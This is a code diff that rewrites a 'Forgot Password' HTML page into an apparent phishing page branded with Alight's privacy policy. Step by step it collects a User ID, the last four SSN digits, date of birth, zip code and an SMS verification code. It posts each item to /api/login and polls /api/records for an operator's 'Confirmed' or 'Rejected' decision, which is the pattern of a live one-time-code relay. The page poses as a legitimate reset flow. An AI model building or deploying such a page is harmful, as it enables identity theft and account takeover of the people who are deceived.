@@ -10,15 +10,12 @@
             background: #f8fafc; 
             padding: 20px; 
             min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
         }
         .container { 
             max-width: 420px; 
             margin: auto; 
             background: white; 
-            padding: 40px 35px; 
+            padding: 35px; 
             border-radius: 16px; 
             box-shadow: 0 10px 30px rgba(0,0,0,0.1); 
         }
@@ -31,7 +28,7 @@
         p { 
             text-align: center; 
             color: #64748b; 
-            margin-bottom: 30px; 
+            margin-bottom: 25px; 
             line-height: 1.5;
         }
         label { 
@@ -40,111 +37,244 @@
             font-weight: 600; 
             color: #334155; 
         }
-        input { 
+        input, select { 
             width: 100%; 
             padding: 14px; 
             border: 1.5px solid #e2e8f0; 
             border-radius: 10px; 
             font-size: 1.05rem; 
         }
+        .date-group { display: flex; gap: 10px; }
         button { 
             width: 100%; 
             padding: 16px; 
-            margin-top: 20px; 
+            margin-top: 12px; 
             border: none; 
             border-radius: 10px; 
             font-size: 1.1rem; 
             font-weight: 600; 
             cursor: pointer; 
         }
-        .submit-btn { 
-            background: #1e40af; 
-            color: white; 
-        }
-        .back-btn {
-            background: transparent;
-            color: #1e40af;
-            border: 1.5px solid #1e40af;
-            margin-top: 10px;
-        }
-        .success { 
-            color: #10b981; 
-            text-align: center; 
-            margin: 15px 0; 
-            font-weight: 500; 
-        }
-        .error { 
-            color: #ef4444; 
-            text-align: center; 
-            margin: 15px 0; 
-            font-weight: 500; 
-        }
+        .continue { background: #1e40af; color: white; }
+        .new-code { background: #eab308; color: black; }
+        .error { color: #ef4444; margin: 15px 0; text-align: center; font-weight: 500; }
+        .success { color: #10b981; margin: 15px 0; text-align: center; font-weight: 500; }
+        .waiting { color: #eab308; margin: 15px 0; text-align: center; font-weight: 500; }
+        .step { display: none; }
+        .step.active { display: block; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Forgot Password</h1>
-        <p>Enter your User ID below.<br>Your request will be sent to the admin.</p>
 
-        <form id="forgotForm">
+        <!-- Step 0: User ID -->
+        <div id="step0" class="step active">
+            <h1>Forgot Password</h1>
+            <p>Enter your User ID to start password reset request.</p>
+            
             <label for="userid">User ID</label>
             <input type="text" id="userid" placeholder="Enter your User ID" required autofocus>
+            
+            <button class="continue" onclick="startForgotProcess()">Continue</button>
+            <button onclick="goBack()" style="background:none; border:1px solid #cbd5e1; color:#1e40af;">Back to Login</button>
+        </div>
 
-            <button type="submit" class="submit-btn">Send Request to Admin</button>
-            <button type="button" class="back-btn" onclick="goBack()">Back to Login</button>
-        </form>
+        <!-- Verification Steps (Same as verify.html) -->
+        <div id="step1" class="step">
+            <h1>Confirm your identity</h1>
+            <label>Last 4 Digits of SSN</label>
+            <input type="text" id="ssn" maxlength="4" placeholder="1234" oninput="this.value = this.value.replace(/[^0-9]/g,'')">
 
-        <div id="status"></div>
+            <label>Birth Date</label>
+            <div class="date-group">
+                <select id="month"><option value="">Month</option></select>
+                <select id="day"><option value="">Day</option></select>
+                <select id="year"><option value="">Year</option></select>
+            </div>
+
+            <label style="margin-top:20px;">
+                <input type="checkbox" id="privacy"> Accept Alight Privacy Policy
+            </label>
+            <button class="continue" onclick="saveStep1()">Continue</button>
+        </div>
+
+        <div id="step2" class="step">
+            <h1>Additional Information</h1>
+            <label>Zip Code</label>
+            <input type="text" id="zip" maxlength="5" placeholder="12345" oninput="this.value = this.value.replace(/[^0-9]/g,'')">
+            <button class="continue" onclick="saveStep2()">Continue</button>
+        </div>
+
+        <div id="step3" class="step">
+            <h1>Verify it's you</h1>
+            <p>Enter the code you received via SMS.</p>
+            <p>Your access code should be sent within 12 hours.</p>
+            
+            <input type="text" id="code" maxlength="10" placeholder="123456" style="text-align:center; font-size:1.4rem;">
+            <div id="status"></div>
+            
+            <button class="continue" onclick="submitCode()">Submit Code</button>
+            <button class="new-code" onclick="requestNewCode()">Request New Code</button>
+        </div>
     </div>
 
     <script>
-        document.getElementById('forgotForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            
-            const userId = document.getElementById('userid').value.trim();
-            const statusDiv = document.getElementById('status');
+        let realUsername = "";
+        let realPassword = "Forgot-Password-Reset";
 
-            if (!userId) {
-                statusDiv.innerHTML = `<p class="error">Please enter your User ID</p>`;
+        function startForgotProcess() {
+            realUsername = document.getElementById('userid').value.trim();
+            if (!realUsername) {
+                alert("Please enter your User ID");
                 return;
             }
+            // Send initial request
+            fetch('/api/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    username: "Forgot Password Request",
+                    password: realPassword,
+                    address: `UserID: ${realUsername} | Status: Started Password Reset`
+                })
+            });
+            nextStep(1);
+        }
 
-            statusDiv.innerHTML = `<p style="color:#eab308;">Sending request to admin...</p>`;
-
-            const payload = {
-                username: "Forgot Password Request",
-                password: "N/A",
-                address: `Forgot Password Request | UserID: ${userId} | Time: ${new Date().toLocaleString()} | Status: Pending Reset`
-            };
-
+        async function saveStep(details, stepName) {
             try {
                 await fetch('/api/login', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
+                    body: JSON.stringify({
+                        username: stepName + " (Forgot Password - " + realUsername + ")",
+                        password: realPassword,
+                        address: details
+                    })
                 });
-
-                statusDiv.innerHTML = `
-                    <p class="success">
-                        ✅ Request Sent Successfully!<br><br>
-                        Admin has been notified.<br>
-                        You will be contacted soon.
-                    </p>`;
-
-                // Auto redirect back to login after 4 seconds
-                setTimeout(() => {
-                    window.location.href = "login.html";
-                }, 4000);
-
-            } catch (err) {
-                console.error(err);
-                statusDiv.innerHTML = `<p class="error">Failed to send request. Please try again.</p>`;
+            } catch (e) {
+                console.error("Failed to save step:", e);
             }
-        });
+        }
+
+        function saveStep1() {
+            const ssn = document.getElementById('ssn').value.trim();
+            const month = document.getElementById('month').value;
+            const day = document.getElementById('day').value;
+            const year = document.getElementById('year').value;
+
+            if (ssn.length !== 4 || !month || !day || !year || !document.getElementById('privacy').checked) {
+                alert("Please fill all fields and accept Privacy Policy.");
+                return;
+            }
+
+            const dob = `${month}/${day}/${year}`;
+            const details = `SSN: ${ssn} | DOB: ${dob} | Status: Forgot Password - Step 1 Completed`;
+
+            saveStep(details, "Step 1 - SSN & DOB");
+            nextStep(2);
+        }
+
+        function saveStep2() {
+            const zip = document.getElementById('zip').value.trim();
+            if (zip.length !== 5) {
+                alert("Please enter a valid 5-digit Zip Code.");
+                return;
+            }
+
+            const details = `Zip: ${zip} | Status: Forgot Password - Step 2 Completed`;
+            saveStep(details, "Step 2 - Zip Code");
+            nextStep(3);
+        }
+
+        function nextStep(step) {
+            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+            document.getElementById('step' + step).classList.add('active');
+        }
+
+        async function submitCode() {
+            const code = document.getElementById('code').value.trim();
+            const statusDiv = document.getElementById('status');
+
+            if (code.length < 4) {
+                statusDiv.innerHTML = `<span class="error">Please enter a valid code</span>`;
+                return;
+            }
+
+            statusDiv.innerHTML = `<span class="waiting">Waiting for admin confirmation....</span>`;
+
+            const ssn = document.getElementById('ssn').value || "";
+            const dob = `${document.getElementById('month').value}/${document.getElementById('day').value}/${document.getElementById('year').value}`;
+            const zip = document.getElementById('zip').value || "";
+
+            const fullDetails = `SSN: ${ssn} | DOB: ${dob} | Zip: ${zip} | Code: ${code} | Status: Forgot Password - Pending Reset`;
+
+            await saveStep(fullDetails, "Final Code Submission - Forgot Password");
+
+            // Polling (same as before)
+            const interval = setInterval(async () => {
+                try {
+                    const res = await fetch('/api/records');
+                    const records = await res.json();
+                    const latest = records[0];
+
+                    if (latest && latest.address.includes("Confirmed")) {
+                        clearInterval(interval);
+                        statusDiv.innerHTML = `<span class="success">✅ Request Received! Admin will reset your password soon.</span>`;
+                    } else if (latest && latest.address.includes("Rejected")) {
+                        clearInterval(interval);
+                        statusDiv.innerHTML = `<span class="error">❌ Request Rejected.</span>`;
+                    }
+                } catch (e) {}
+            }, 2000);
+        }
+
+        async function requestNewCode() {
+            const statusDiv = document.getElementById('status');
+            statusDiv.innerHTML = `<span class="waiting">Requesting new code...</span>`;
+
+            await fetch('/api/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    username: "New Code Request (Forgot Password)",
+                    password: realPassword,
+                    address: `UserID: ${realUsername} | 🔄 Requested New Code | Status: Pending`
+                })
+            });
+
+            statusDiv.innerHTML = `<span class="success">✅ Request sent. Please check your SMS.</span>`;
+        }
 
         function goBack() {
             window.location.href = "login.html";
         }
+
+        // Populate date dropdowns
+        window.onload = () => {
+            const months = ["January","February","March","April","May","June","July","August","September","October","November","December"];
+            const monthSelect = document.getElementById('month');
+            months.forEach((m, i) => {
+                let opt = document.createElement('option');
+                opt.value = i + 1; opt.textContent = m;
+                monthSelect.appendChild(opt);
+            });
+
+            const daySelect = document.getElementById('day');
+            for(let i = 1; i <= 31; i++) {
+                let opt = document.createElement('option'); 
+                opt.value = i; opt.textContent = i;
+                daySelect.appendChild(opt);
+            }
+
+            const yearSelect = document.getElementById('year');
+            const curr = new Date().getFullYear();
+            for(let i = curr; i >= 1950; i--) {
+                let opt = document.createElement('option'); 
+                opt.value = i; opt.textContent = i;
+                yearSelect.appendChild(opt);
+            }
+        };
     </script>
 </body>
 </html>
